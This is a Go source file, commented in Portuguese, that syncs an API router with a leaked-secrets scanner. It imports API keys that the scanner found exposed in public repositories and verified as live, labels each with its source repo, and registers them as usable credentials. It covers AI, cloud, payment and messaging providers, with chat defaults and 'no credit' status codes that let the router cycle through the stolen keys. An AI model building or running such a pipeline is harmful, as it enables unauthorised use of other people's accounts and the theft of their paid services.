package main

// Sync automático do Roteador de APIs com o scanner de secrets vazados
// (secrets-go): a cada SECRETS_SYNC_INTERVAL, o api-go puxa os hits que o
// scanner confirmou ativos (liveActive) e os cadastra no roteador — criando
// um provider automático por provedor quando ainda não existe. Idempotente:
// chave já importada (mesmo valor) não duplica.
//
// Habilitado só quando SECRETS_SYNC_TOKEN E API_VAULT_SECRET estão setados —
// sem token não há como autenticar no secrets-go, e sem vault não há como
// cifrar as chaves antes de persistir (ver syncEnabled).

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"strings"
	"time"

	"github.com/santos-tech/auth/db"
)

// secretsSyncHTTP é o cliente usado na chamada ao secrets-go. Timeout curto:
// o sync roda em background e não deve ficar preso em rede.
var secretsSyncHTTP = &http.Client{Timeout: 30 * time.Second}

// secretsSyncHit é o subconjunto do Hit do secrets-go que o roteador precisa
// pra importar a chave — ignora campos só de exibição (repoUrl, fileUrl...).
type secretsSyncHit struct {
	RepoFullName    string `json:"repoFullName"`
	FilePath        string `json:"filePath"`
	Keyword         string `json:"keyword"`
	MatchedValue    string `json:"matchedValue"`
	VerifierFamily  string `json:"verifierFamily"`
	GuessedProvider string `json:"guessedProvider"`
	LiveActive      bool   `json:"liveActive"`
}

type secretsSyncResponse struct {
	Hits []secretsSyncHit `json:"hits"`
}

// syncEnabled reporta se o sync está habilitado: token do secrets-go, URL
// configurada E vault disponível (pra cifrar as chaves antes de persistir).
func (s *Server) syncEnabled() bool {
	return s.cfg.SecretsSyncToken != "" && s.cfg.SecretsSyncURL != "" && s.vault != nil
}

// syncAPIRouterFromSecrets roda uma passada do sync. Chamado uma vez no boot
// e depois a cada SECRETS_SYNC_INTERVAL (ver main.go).
func (s *Server) syncAPIRouterFromSecrets(ctx context.Context) error {
	if !s.syncEnabled() {
		return nil
	}

	hits, err := s.fetchActiveSecretsHits(ctx)
	if err != nil {
		return err
	}

	providers, err := s.q.ListAPIRouterProviders(ctx)
	if err != nil {
		return fmt.Errorf("sync: listar providers: %w", err)
	}
	byName := make(map[string]db.ApiRouterProvider, len(providers))
	for _, p := range providers {
		byName[p.Name] = p
	}

	var createdProviders, createdKeys, skippedUnknown, skippedDup int
	for _, hit := range hits {
		if !hit.LiveActive || hit.MatchedValue == "" || hit.VerifierFamily == "" {
			continue
		}
		def, ok := syncProviderDefaultsFor(hit.VerifierFamily)
		if !ok {
			skippedUnknown++
			continue
		}

		provider, ok := byName[def.Name]
		if !ok {
			p, err := s.q.InsertAPIRouterProvider(ctx, db.InsertAPIRouterProviderParams{
				Name:              def.Name,
				BaseUrl:           def.BaseURL,
				AuthHeader:        def.AuthHeader,
				AuthScheme:        def.AuthScheme,
				UnauthorizedCodes: def.UnauthorizedCodes,
				NoCreditCodes:     def.NoCreditCodes,
				TestPath:          def.TestPath,
				TestMethod:        def.TestMethod,
				ChatAdapter:       def.ChatAdapter,
				ChatPath:          def.ChatPath,
				ChatModel:         def.ChatModel,
			})
			if err != nil {
				// Corrida entre dois syncs simultâneos (name é UNIQUE): o
				// provider nasceu entre a listagem e o insert. Na próxima
				// passada a lista já o enxerga.
				slog.Warn("sync: falha ao criar provider (provável corrida)", "name", def.Name, "err", err)
				continue
			}
			provider = p
			byName[def.Name] = p
			createdProviders++
		} else if (provider.ChatAdapter != def.ChatAdapter || provider.ChatPath != def.ChatPath || provider.ChatModel != def.ChatModel) && def.ChatAdapter != "" {
			// Provider já existia (criado pelo sync antes do mapeamento de
			// adapters, ou manualmente com o default errado) — corrige o
			// adapter e os defaults de chat (path/modelo) pra família certa.
			// Só mexe em chat_adapter/chat_path/chat_model, não nos demais.
			p, err := s.q.SetAPIRouterProviderChatAdapter(ctx, db.SetAPIRouterProviderChatAdapterParams{
				ID: provider.ID, ChatAdapter: def.ChatAdapter, ChatPath: def.ChatPath, ChatModel: def.ChatModel,
			})
			if err != nil {
				slog.Warn("sync: falha ao corrigir chat_adapter", "provider", provider.Name, "err", err)
				continue
			}
			provider = p
			byName[def.Name] = p
		}

		exists, err := s.apirouterSecretExists(ctx, provider.ID, hit.MatchedValue)
		if err != nil {
			slog.Warn("sync: falha ao checar chave existente", "provider", provider.Name, "err", err)
			continue
		}
		if exists {
			skippedDup++
			continue
		}

		enc, err := s.vault.Encrypt(hit.MatchedValue)
		if err != nil {
			slog.Warn("sync: falha ao cifrar chave", "provider", provider.Name, "err", err)
			continue
		}
		if _, err := s.q.InsertAPIRouterKey(ctx, db.InsertAPIRouterKeyParams{
			ProviderID: provider.ID,
			Label:      syncKeyLabel(hit),
			SecretEnc:  enc,
			SecretTail: maskSecret(hit.MatchedValue),
			Priority:   0,
		}); err != nil {
			slog.Warn("sync: falha ao inserir chave", "provider", provider.Name, "err", err)
			continue
		}
		createdKeys++
	}

	// Passada de correção dos defaults de chat: percorre TODO o catálogo e
	// ajusta chat_adapter/chat_path/chat_model dos providers que já existem
	// (criados manualmente, ou pelo sync antes do mapeamento). Garante que um
	// provider sem hit recente (ex.: chave adicionada à mão) também herde o
	// path/modelo nativos da família — sem isso o /chat usa o default genérico
	// da OpenAI e quebra (Mistral não tem gpt-4o-mini, OpenRouter não é
	// /v1/chat/completions etc.).
	var chatFixed int
	for family, def := range syncProviderCatalog {
		if def.ChatAdapter == "" {
			continue
		}
		provider, ok := byName[def.Name]
		if !ok {
			continue
		}
		if provider.ChatAdapter == def.ChatAdapter && provider.ChatPath == def.ChatPath && provider.ChatModel == def.ChatModel {
			continue
		}
		p, err := s.q.SetAPIRouterProviderChatAdapter(ctx, db.SetAPIRouterProviderChatAdapterParams{
			ID: provider.ID, ChatAdapter: def.ChatAdapter, ChatPath: def.ChatPath, ChatModel: def.ChatModel,
		})
		if err != nil {
			slog.Warn("sync: falha ao corrigir defaults de chat", "provider", provider.Name, "family", family, "err", err)
			continue
		}
		provider = p
		byName[def.Name] = p
		chatFixed++
	}

	slog.Info("sync do roteador de APIs com secrets-go concluído",
		"providers", createdProviders, "keys", createdKeys,
		"dup", skippedDup, "unknownFamily", skippedUnknown, "chatFixed", chatFixed)
	return nil
}

// fetchActiveSecretsHits chama o endpoint interno do secrets-go, que já
// devolve só os hits com valor confirmado ativo (liveActive).
func (s *Server) fetchActiveSecretsHits(ctx context.Context) ([]secretsSyncHit, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, s.cfg.SecretsSyncURL+"/internal/sync-hits", nil)
	if err != nil {
		return nil, fmt.Errorf("sync: montar request: %w", err)
	}
	req.Header.Set("x-sync-token", s.cfg.SecretsSyncToken)
	req.Header.Set("User-Agent", "api-go")

	resp, err := secretsSyncHTTP.Do(req)
	if err != nil {
		return nil, fmt.Errorf("sync: chamar secrets-go: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		b, _ := io.ReadAll(io.LimitReader(resp.Body, 512))
		return nil, fmt.Errorf("sync: secrets-go respondeu %s: %s", resp.Status, strings.TrimSpace(string(b)))
	}
	var out secretsSyncResponse
	if err := json.NewDecoder(resp.Body).Decode(&out); err != nil {
		return nil, fmt.Errorf("sync: decodificar resposta: %w", err)
	}
	return out.Hits, nil
}

// apirouterSecretExists confere se o valor de uma chave já está cadastrada no
// provider. Compara o plaintext decifrado de todas as chaves existentes — o
// secret_tail não basta (não é único). AES-GCM usa nonce aleatório, então o
// mesmo secret gera ciphertexts diferentes a cada cifragem; comparar o
// plaintext é a única forma confiável de deduplicar.
func (s *Server) apirouterSecretExists(ctx context.Context, providerID int64, secret string) (bool, error) {
	keys, err := s.q.ListAPIRouterKeys(ctx, providerID)
	if err != nil {
		return false, err
	}
	for _, k := range keys {
		plain, err := s.vault.Decrypt(k.SecretEnc)
		if err != nil {
			continue // indecifrável (vault trocado?) — não bloqueia o sync
		}
		if plain == secret {
			return true, nil
		}
	}
	return false, nil
}

// syncKeyLabel monta o rótulo da chave importada: repo + keyword, deixando
// claro no painel de onde o scanner tirou o valor (e que é uma chave vazada).
func syncKeyLabel(hit secretsSyncHit) string {
	label := "scan: " + hit.RepoFullName
	if hit.Keyword != "" {
		label += " (" + hit.Keyword + ")"
	}
	if len(label) > 160 {
		label = label[:160]
	}
	return label
}

// ── Catálogo de providers automáticos ────────────────────────────────────────
// Cada family do verificador do secrets-go (verifiers.go/fingerprint.go) com
// auth expressável pelo modelo do roteador (um único header com valor opcional
// prefixado) tem um provider padrão aqui. Families que dependem de Basic Auth
// (Stripe, Pagar.me, Mailgun), token na URL (Telegram) ou query param (Gemini,
// Firebase) NÃO entram: o roteador não saberia usá-las, então o sync as pula.
// A listagem de providers já existentes no roteador não é alterada — só se
// acrescenta o que falta.

type syncProviderDefaults struct {
	Name              string
	BaseURL           string
	AuthHeader        string
	AuthScheme        string
	UnauthorizedCodes []int32
	NoCreditCodes     []int32
	TestPath          string
	TestMethod        string
	ChatAdapter       string
	ChatPath          string
	ChatModel         string
}

func syncProviderDefaultsFor(family string) (syncProviderDefaults, bool) {
	d, ok := syncProviderCatalog[family]
	return d, ok
}

func bearerDefaults(name, baseURL, testPath string) syncProviderDefaults {
	return syncProviderDefaults{
		Name: name, BaseURL: baseURL,
		AuthHeader:        "Authorization",
		AuthScheme:        "Bearer",
		UnauthorizedCodes: []int32{401},
		NoCreditCodes:     []int32{402, 429},
		TestPath:          testPath,
		TestMethod:        "GET",
		ChatAdapter:       chatAdapterOpenAICompatible,
		ChatPath:          "/v1/chat/completions",
	}
}

func customHeaderDefaults(name, baseURL, authHeader, authScheme, testPath string) syncProviderDefaults {
	return syncProviderDefaults{
		Name: name, BaseURL: baseURL,
		AuthHeader:        authHeader,
		AuthScheme:        authScheme,
		UnauthorizedCodes: []int32{401},
		NoCreditCodes:     []int32{402, 429},
		TestPath:          testPath,
		TestMethod:        "GET",
		ChatAdapter:       chatAdapterOpenAICompatible,
		ChatPath:          "/v1/chat/completions",
	}
}

var syncProviderCatalog = map[string]syncProviderDefaults{
	// IA / LLM (API no formato OpenAI, na maioria). chat_path/chat_model são
	// os defaults usados pelo /chat quando o admin não informa modelo — cada
	// família tem o path nativo e um modelo de teste que existe de verdade
	// (o gpt-4o-mini só existe na OpenAI, o que quebrava os demais providers).
	"openai":     func() syncProviderDefaults { d := bearerDefaults("OpenAI", "https://api.openai.com", "/v1/models"); d.ChatModel = "gpt-4o-mini"; return d }(),
	"anthropic":  func() syncProviderDefaults { d := customHeaderDefaults("Anthropic", "https://api.anthropic.com", "x-api-key", "", "/v1/models"); d.ChatAdapter = chatAdapterAnthropic; d.ChatPath = "/v1/messages"; d.ChatModel = "claude-sonnet-4-5"; return d }(),
	"groq":       func() syncProviderDefaults { d := bearerDefaults("Groq", "https://api.groq.com", "/openai/v1/models"); d.ChatPath = "/openai/v1/chat/completions"; d.ChatModel = "llama-3.3-70b-versatile"; return d }(),
	"mistral":    func() syncProviderDefaults { d := bearerDefaults("Mistral", "https://api.mistral.ai", "/v1/models"); d.ChatModel = "mistral-large-latest"; return d }(),
	"cohere":     func() syncProviderDefaults { d := bearerDefaults("Cohere", "https://api.cohere.com", "/v1/models"); d.ChatAdapter = chatAdapterCohere; d.ChatPath = "/v2/chat"; d.ChatModel = "command-a-03-2025"; return d }(),
	"deepseek":   func() syncProviderDefaults { d := bearerDefaults("DeepSeek", "https://api.deepseek.com", "/user/balance"); d.ChatModel = "deepseek-chat"; return d }(),
	"openrouter": func() syncProviderDefaults { d := bearerDefaults("OpenRouter", "https://openrouter.ai", "/api/v1/auth/key"); d.ChatPath = "/api/v1/chat/completions"; d.ChatModel = "openai/gpt-4o-mini"; return d }(),
	"together":   func() syncProviderDefaults { d := bearerDefaults("Together AI", "https://api.together.xyz", "/v1/models"); d.ChatModel = "meta-llama/Llama-3.3-70B-Instruct-Turbo"; return d }(),
	"fireworks":  func() syncProviderDefaults { d := bearerDefaults("Fireworks AI", "https://api.fireworks.ai", "/inference/v1/models"); d.ChatPath = "/inference/v1/chat/completions"; d.ChatModel = "accounts/fireworks/models/llama-v3p3-70b-instruct"; return d }(),
	"xai":        func() syncProviderDefaults { d := bearerDefaults("xAI (Grok)", "https://api.x.ai", "/v1/models"); d.ChatModel = "grok-3-mini"; return d }(),
	"stability":  bearerDefaults("Stability AI", "https://api.stability.ai", "/v1/user/account"),
	"deepgram":   customHeaderDefaults("Deepgram", "https://api.deepgram.com", "Authorization", "Token", "/v1/projects"),
	"assemblyai": customHeaderDefaults("AssemblyAI", "https://api.assemblyai.com", "authorization", "", "/v2/transcript"),
	"elevenlabs": customHeaderDefaults("ElevenLabs", "https://api.elevenlabs.io", "xi-api-key", "", "/v1/user"),
	"replicate":  customHeaderDefaults("Replicate", "https://api.replicate.com", "Authorization", "Token", "/v1/account"),

	// Cloud / Infra
	"github":       bearerDefaults("GitHub", "https://api.github.com", "/user"),
	"huggingface":  bearerDefaults("Hugging Face", "https://huggingface.co", "/api/whoami-v2"),
	"digitalocean": bearerDefaults("DigitalOcean", "https://api.digitalocean.com", "/v2/account"),
	"vercel":       bearerDefaults("Vercel", "https://api.vercel.com", "/v2/user"),
	"netlify":      bearerDefaults("Netlify", "https://api.netlify.com", "/api/v1/user"),
	"npm":          bearerDefaults("npm", "https://registry.npmjs.org", "/-/npm/v1/user"),
	"heroku":       bearerDefaults("Heroku", "https://api.heroku.com", "/account"),
	"cloudflare":   bearerDefaults("Cloudflare", "https://api.cloudflare.com", "/client/v4/user/tokens/verify"),
	"gitlab":       bearerDefaults("GitLab", "https://gitlab.com", "/api/v4/user"),
	"circleci":     customHeaderDefaults("CircleCI", "https://circleci.com", "Circle-Token", "", "/api/v2/me"),
	"datadog":      customHeaderDefaults("Datadog", "https://api.datadoghq.com", "DD-API-KEY", "", "/api/v1/validate"),
	"figma":        customHeaderDefaults("Figma", "https://api.figma.com", "X-Figma-Token", "", "/v1/me"),

	// Comunicação / Auth / Analytics
	"slack":       syncProviderDefaults{Name: "Slack", BaseURL: "https://slack.com", AuthHeader: "Authorization", AuthScheme: "Bearer", UnauthorizedCodes: []int32{401}, NoCreditCodes: []int32{402, 429}, TestPath: "/api/auth.test", TestMethod: "POST"},
	"discord":     customHeaderDefaults("Discord", "https://discord.com", "Authorization", "Bot", "/api/v10/users/@me"),
	"sendgrid":    bearerDefaults("SendGrid", "https://api.sendgrid.com", "/v3/scopes"),
	"mercadopago": bearerDefaults("Mercado Pago", "https://api.mercadopago.com", "/users/me"),
	"asaas":       customHeaderDefaults("Asaas", "https://api.asaas.com", "access_token", "", "/v3/myAccount"),
	"square":      bearerDefaults("Square", "https://connect.squareup.com", "/v2/locations"),
	"clerk":       bearerDefaults("Clerk", "https://api.clerk.com", "/v1/users?limit=1"),
	"resend":      bearerDefaults("Resend", "https://api.resend.com", "/domains"),
	"sentry":      bearerDefaults("Sentry", "https://sentry.io", "/api/0/organizations/"),
	"abacatepay":  bearerDefaults("AbacatePay", "https://api.abacatepay.com", "/v1/store/get"),
	"dotfy":       bearerDefaults("Dotfy", "https://app.dotfy.com.br", "/api/auth/me"),
}
